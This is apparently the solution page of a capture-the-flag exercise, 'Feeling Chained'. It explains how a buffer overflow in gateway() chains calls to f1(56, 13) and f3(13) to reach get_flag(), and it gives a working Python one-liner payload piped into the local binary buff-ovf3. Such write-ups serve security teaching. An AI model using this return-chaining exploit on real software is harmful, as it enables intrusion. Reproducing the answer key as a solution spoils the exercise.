---
nav_order: 1
parent: 'Task: Feeling Chained'
---

# Solution

By using the buffer overflow in `gateway()`, functions `f1(56, 13)` and `f3(13)` need to be called in this order, with those exact parameters.
`f3` is the one that actually calls `get_flag()`.
Calling `get_flag()` directly shouldn't work (a global variable is checked to make sure all steps were made).

```sh
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*22 + b"\x56\x93\x04\x08" + b"\x00\x93\x04\x08" + b"\x38\x00\x00\x00" + b"\x0d\x00\x00\x00")' | ./buff-ovf3
```
